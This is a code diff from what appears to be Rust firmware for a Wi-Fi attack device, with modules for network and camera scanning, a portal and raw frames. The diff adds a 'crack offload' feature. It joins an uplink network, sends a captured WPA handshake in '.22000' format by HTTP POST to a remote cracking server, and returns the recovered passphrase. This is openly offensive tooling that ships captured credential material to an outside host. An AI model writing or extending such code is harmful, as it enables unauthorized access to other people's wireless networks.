@@ -26,6 +26,7 @@ pub mod camscan;
 pub mod digest;
 pub mod http;
 pub mod netscan;
+pub mod offload;
 pub mod portal;
 pub mod webui;
 pub mod wifi_frames;
@@ -1109,6 +1110,48 @@ impl Radio {
         res.set_wifi_pass(cracked);
         self.deinit_wifi();
         Ok(res)
+    }
+
+    // ----------------------------- crack offload ----------------------------
+
+    /// Join the uplink `ssid`/`pass`, DHCP, then `POST /crack` the captured
+    /// `.22000` line to `server_ip:port` with the optional `psk`, and return the
+    /// recovered passphrase (`Ok(Some(pw))` cracked, `Ok(None)` not in the server
+    /// wordlist / no reply). `server_ip` must be a dotted IPv4 (no DNS on-device).
+    /// The STA is torn down on exit. `Err(reason)` carries a SPECIFIC failure.
+    #[inline(never)]
+    pub fn run_offload(
+        &mut self,
+        ssid: &str,
+        pass: &str,
+        server_ip: &str,
+        port: u16,
+        psk: Option<&str>,
+        body: &str,
+        mut tick: impl FnMut(&offload::OffloadResult) -> bool,
+    ) -> Result<Option<alloc::string::String>, &'static str> {
+        let server = offload::parse_ipv4(server_ip).ok_or("server IP must be a.b.c.d")?;
+        self.associate(ssid, Some(pass), |_, _| true)?;
+        let sta = self.wifi_ifaces.as_ref().ok_or("no iface")?.station;
+        let mac = sta.mac_address();
+        let res = offload::submit(sta, mac, server, port, body, psk, &mut tick);
+        self.deinit_wifi();
+        if !res.got_ip {
+            return Err(if res.phase == "aborted" {
+                "offload aborted"
+            } else {
+                "no DHCP lease on uplink"
+            });
+        }
+        // distinguish the crack server's own error replies from a real "not found"
+        // (200 + empty body); otherwise "forbidden"/"busy" gets shown as a password.
+        match res.status {
+            200 => Ok(res.recovered),
+            403 => Err("offload: bad PSK"),
+            503 => Err("offload: server busy"),
+            0 => Err("offload: no reply"),
+            _ => Err("offload: server error"),
+        }
     }
 
     // ------------------------------ web ui -----------------------------
